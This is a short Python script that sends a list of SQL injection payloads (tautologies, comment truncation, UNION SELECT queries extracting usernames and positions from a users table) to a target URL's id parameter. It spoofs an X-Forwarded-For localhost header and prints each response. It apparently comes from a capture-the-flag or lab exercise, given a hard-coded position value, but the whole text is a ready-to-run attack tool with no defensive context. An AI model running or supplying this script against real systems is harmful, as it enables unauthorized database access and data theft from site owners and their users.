import requests, sys

def sqli():
    url = sys.argv[1] 
    headers = {"X-Forwarded-For": "127.0.0.1"}
    
    # Classic SQLi payloads
    payloads = [
        "1 OR 1=1",
        "1' OR '1'='1",
        "1' OR 1=1 --",
        "1' OR '1'='1' --",
        "admin' --",
        "' OR 'a'='a",
        "1' UNION SELECT NULL,NULL,NULL --",
        "1 UNION SELECT NULL,username,position FROM users WHERE position=736373",
        "1' AND position='736373' --",
        "1' OR position='736373' --",
    ]
    
    for payload in payloads:
        try:
            r = requests.get(
                f"{url}/?id={payload}", #CHANGE IF DIFFEENT
                headers=headers,
                timeout=5
            )
            print(f"[Payload: {payload}]")
            print(f"Response: {r.text}\n")
        except Exception as e:
            print(f"[Payload: {payload}] Error: {e}\n")

sqli()
